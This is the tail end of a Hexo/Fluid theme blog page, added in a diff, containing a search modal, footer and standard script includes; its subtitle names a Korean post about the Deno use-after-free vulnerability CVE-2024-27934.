+      <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+    </a>
+  
+
+  
+    <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel" aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">keyword</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+  
+
+  
+
+  
+
+  <footer class="mt-5">
+  <div class="text-center py-3">
+    <div>
+      <a href="https://hexo.io" target="_blank" rel="external nofollow noopener noreferrer"><span>Hexo</span></a>
+      <i class="iconfont icon-love"></i>
+      <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="external nofollow noopener noreferrer">
+        <span>Fluid</span></a>
+    </div>
+    
+
+    
+
+    
+  </div>
+</footer>
+
+<!-- SCRIPTS -->
+<script src="https://cdn.staticfile.org/jquery/3.4.1/jquery.min.js"></script>
+<script src="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/js/bootstrap.min.js"></script>
+<script src="/js/debouncer.js"></script>
+<script src="/js/main.js"></script>
+
+<!-- Plugins -->
+
+
+  
+    <script src="/js/lazyload.js"></script>
+  
+
+
+
+  <script defer src="https://cdn.staticfile.org/clipboard.js/2.0.6/clipboard.min.js"></script>
+  <script src="/js/clipboard-use.js"></script>
+
+
+
+
+
+
+
+  <script src="https://cdn.staticfile.org/tocbot/4.11.1/tocbot.min.js"></script>
+  <script>
+    $(document).ready(function () {
+      var boardCtn = $('#board-ctn');
+      var boardTop = boardCtn.offset().top;
+
+      tocbot.init({
+        tocSelector: '#tocbot',
+        contentSelector: '#post-body',
+        headingSelector: 'h1,h2,h3,h4,h5,h6',
+        linkClass: 'tocbot-link',
+        activeLinkClass: 'tocbot-active-link',
+        listClass: 'tocbot-list',
+        isCollapsedClass: 'tocbot-is-collapsed',
+        collapsibleClass: 'tocbot-is-collapsible',
+        collapseDepth: 0,
+        scrollSmooth: true,
+        headingsOffset: -boardTop
+      });
+      if ($('.toc-list-item').length > 0) {
+        $('#toc').css('visibility', 'visible');
+      }
+    });
+  </script>
+
+
+
+  <script src="https://cdn.staticfile.org/typed.js/2.0.11/typed.min.js"></script>
+  <script>
+    var typed = new Typed('#subtitle', {
+      strings: [
+        '  ',
+        "[하루한줄] CVE-2024-27934: Deno의 Use-After-Free로 인한 RCE 취약점&nbsp;",
+      ],
+      cursorChar: "_",
+      typeSpeed: 70,
+      loop: false,
+    });
+    typed.stop();
+    $(document).ready(function () {
+      $(".typed-cursor").addClass("h2");
+      typed.start();
+    });
+  </script>
+
+
+
+  <script src="https://cdn.staticfile.org/anchor-js/4.2.2/anchor.min.js"></script>
+  <script>
+    anchors.options = {
+      placement: "right",
+      visible: "hover",
+      
+    };
+    var el = "h1,h2,h3,h4,h5,h6".split(",");
+    var res = [];
+    for (item of el) {
+      res.push(".markdown-body > " + item)
+    }
+    anchors.add(res.join(", "))
+  </script>
+
+
+
+  <script src="/js/local-search.js"></script>
+  <script>
+    var path = "/local-search.xml";
+    var inputArea = document.querySelector("#local-search-input");
+    inputArea.onclick = function () {
+      searchFunc(path, 'local-search-input', 'local-search-result');
+      this.onclick = null
+    }
+  </script>
+
+
+
+  <script src="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.js"></script>
+  <link rel="stylesheet" href="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.css">
+
+  <script>
+    $('#post img:not(.no-zoom img, img[no-zoom]), img[zoom]').each(
+      function () {
+        var element = document.createElement('a');
+        $(element).attr('data-fancybox', 'images');
+        $(element).attr('href', $(this).attr('src'));
+        $(this).wrap(element);
+      }
+    );
+  </script>
+
+
+
+
+
+  
+
+  
+    <!-- MathJax -->
+    <script>
+      MathJax = {
+        tex: {
+          inlineMath: [['$', '$'], ['\\(', '\\)']]
+        },
+        options: {
+          renderActions: {
+            findScript: [10, doc => {
+              document.querySelectorAll('script[type^="math/tex"]').forEach(node => {
+                const display = !!node.type.match(/; *mode=display/);
+                const math = new doc.options.MathItem(node.textContent, doc.inputJax[0], display);
+                const text = document.createTextNode('');
+                node.parentNode.replaceChild(text, node);
+                math.start = { node: text, delim: '', n: 0 };
+                math.end = { node: text, delim: '', n: 0 };
+                doc.math.push(math);
+              });
+            }, '', false],
+            insertedScript: [200, () => {
+              document.querySelectorAll('mjx-container').forEach(node => {
+                let target = node.parentNode;
+                if (target.nodeName.toLowerCase() === 'li') {
+                  target.parentNode.classList.add('has-jax');
+                }
+              });
+            }, '', false]
+          }
+        }
+      };
+    </script>
+
+    <script async src="https://cdn.staticfile.org/mathjax/3.0.5/es5/tex-svg.js"></script>
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+    <!-- Google Analytics -->
+    <script defer>
+      window.ga = window.ga || function () { (ga.q = ga.q || []).push(arguments) };
+      ga.l = +new Date;
+      ga('create', 'UA-177243668-2', 'auto');
+      ga('send', 'pageview');
+    </script>
+    <script async src="https://www.google-analytics.com/analytics.js"></script>
+  
+
+  
+    <!-- Google gtag.js -->
+    <script async src="https://www.googletagmanager.com/gtag/js?id=UA-177243668-2"></script>
+    <script defer>
+        window.dataLayer = window.dataLayer || [];
+        function gtag(){dataLayer.push(arguments);}
+        gtag('js', new Date());
+        gtag('config', 'UA-177243668-2');
+    </script>
+  
+
+  
+
+  
+
+  
+
+
+
+
+
+</body>
+</html>
